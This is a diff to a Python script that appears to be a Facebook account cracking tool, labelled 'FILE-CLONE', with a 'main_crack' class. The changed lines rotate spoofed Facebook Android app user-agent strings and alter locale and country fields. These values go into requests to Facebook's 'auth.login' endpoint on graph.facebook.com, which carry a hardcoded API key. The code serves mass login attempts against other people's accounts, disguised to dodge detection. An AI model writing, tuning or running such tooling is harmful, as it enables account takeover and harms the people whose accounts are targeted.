@@ -279,17 +279,17 @@ princp=[]
 def randBuildLSB():
     vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
     VAPP = random.randint(410000000,499999999)
-    END = 'FBAN/FB4A;FBAV/402.0.0.67;FBBV/1452662;[FBAN/FB4A;FBAV/376.0.0.12.108;FBBV/8200977;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Telstra Mobile;FBMF/Camon 16;FBBD/Camon 16;FBPN/com.facebook.katana;FBDV/Camon 16;FBSV/4.4.2;FBCA/armeabi-v7a:armeabi;]'
+    END = '[FBAN/FB4A;FBAV/303.0.0.3.124;FBBV/533556795;FBDM/{density=2.3,width=1080,height=1478};FBLC/en_GB;FBRV/968917366;FBCR/Jazz;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 
 def randFBAN():
   VAPP = random.randint(410000000,499999999)
-  ua="[FBAN/FB4A;FBAV/384.0.0.8.140;FBBV/"+str(VAPP)+";FBDM/{density=3.3,width=1080,height=1458};FBLC/en_US;FBRV/974470275;FBCR/Vi India;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/"+random.choice(model2)+";FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
+  ua="[FBAN/FB4A;FBAV/68.0.0.3593;FBBV/"+str(VAPP)+";FBDM/{density=2.5,width=780,height=1920};FBLC/fr_IN;FBRV/4214899694;FBCR/1030;FBMF/Realme;FBBD/Ostin;FBPN/com.facebook.katana;FBDV/"+random.choice(model2)+";FBSV/16;FBOP/5;FBCA/arm64-v8a:;]"
   return ua
 
 def randBuildvsskj():
-    END = '[FBAN/FB4A;FBAV/201.0.0.4.185;FBBV/721475978;FBDM/{density=3.2,width=1080,height=1430};FBLC/en_GB;FBRV/549098911;FBCR/Jazz;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
+    END = '[FBAN/FB4A;FBAV/49.0.0.4120;FBBV/9006006;[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184932;FBDM/{density=3.0,width=1080,height=2102};FBLC/en_IN;FBRV/0;FBCR/MLS;FBMF/Magic;FBBD/Magic;FBPN/com.facebook.katana;FBDV/iQ3204;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/DANGER2A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
     
@@ -342,7 +342,7 @@ logo ="""
 \033[1;37m[\033[1;32m•\033[1;37m]\033[1;32m  TOOLS        :   \033[1;32mFILE-CLONE
 \033[1;37m[\033[1;33m•\033[1;37m]\033[1;33m  VERSION      :   \033[1;33m1.0
 \033[1;37m[\033[1;34m•\033[1;37m]\033[1;34m  WORKING      :   \033[1;34mDATA/WIFI
-\033[1;37m[\033[1;35m•\033[1;37m]\033[1;35m  WHATSAPP     :   \033[1;35mNot Found
+\033[1;37m[\033[1;35m•\033[1;37m]\033[1;35m  WHATSAPP     :   \033[1;35m013108682**
 \033[1;32m------------------------------------------------------"""
 def clear():
     os.system("clear")
@@ -455,13 +455,13 @@ class main_crack():
 "meta_inf_fbmeta": "",
 "advertiser_id": str(uuid.uuid4()),
 "currently_logged_in_userid": "0",
-"locale": "en_US",
-"client_country_code": "US",
+"locale": "fr_IN",
+"client_country_code": "NP",
 "method": "auth.login",
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent':('FBAN/FB4A;FBAV/402.0.0.67;FBBV/1452662;[FBAN/FB4A;FBAV/376.0.0.12.108;FBBV/8200977;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Telstra Mobile;FBMF/Camon 16;FBBD/Camon 16;FBPN/com.facebook.katana;FBDV/Camon 16;FBSV/4.4.2;FBCA/armeabi-v7a:armeabi;]'),
+                headers = {'User-Agent':('[FBAN/FB4A;FBAV/49.0.0.4120;FBBV/9006006;[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184932;FBDM/{density=3.0,width=1080,height=2102};FBLC/en_IN;FBRV/0;FBCR/MLS;FBMF/Magic;FBBD/Magic;FBPN/com.facebook.katana;FBDV/iQ3204;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'),
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
